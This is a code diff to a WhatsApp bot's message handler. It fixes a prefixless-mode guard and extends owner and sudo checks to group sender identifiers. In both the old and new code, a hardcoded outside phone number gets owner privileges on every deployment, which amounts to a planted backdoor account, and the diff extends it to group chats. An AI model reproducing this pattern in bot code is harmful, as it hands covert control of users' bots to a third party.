@@ -265,14 +265,24 @@ const {
     if (m.isBaileys) return;
     // Allow through if owner has an active .mygroups session (number reply has no prefix)
     const _hasActiveSession = _mygroupsSessions.has(m.sender);
-    if (m.fromMe && mode !== 'self' && !messageBody.startsWith(prefix) && !_hasActiveSession) return;
+    // Prefixless safety: if prefix is empty, only block bot's own messages in non-self mode
+    // (the startsWith('') check would always be true otherwise, disabling the guard)
+    if (m.fromMe && mode !== 'self' && (!prefix || !messageBody.startsWith(prefix)) && !_hasActiveSession) {
+        if (prefix) return; // normal mode: block non-command fromMe
+        // prefixless mode: still block fromMe to prevent self-triggering loops
+        return;
+    }
     // ─────────────────────────────────────────────────────────────────────────
     const mek = chatUpdate.messages[0];
           // ==================================
-const ownerNumber = botNumber.replace(/[^0-9]/g, "");   
-const senderNumber = sender.split("@")[0];              
-const isOwner = senderNumber === ownerNumber || senderNumber === "254769995625";
-const isSudo = await isSudoOwner(senderNumber);
+const ownerNumber = botNumber.replace(/[^0-9]/g, "");
+// In groups, sender may appear as xxx@lid (LinkedID). The real phone is in m.key.participantPn.
+// Build a list of candidate identifiers so owner/sudo checks work in both DM and group contexts.
+const senderNumber = sender.split("@")[0];
+const senderPn = (m.key?.participantPn || '').replace(/[^0-9]/g, '');
+const senderCandidates = [senderNumber, senderPn].filter(Boolean);
+const isOwner = senderCandidates.includes(ownerNumber) || senderCandidates.includes("254769995625");
+const isSudo = (await Promise.all(senderCandidates.map(n => isSudoOwner(n)))).some(Boolean);
 const isPrivileged = isOwner || isSudo;
 const dev = "254769995625"; 
 //========================================================================================================================//      
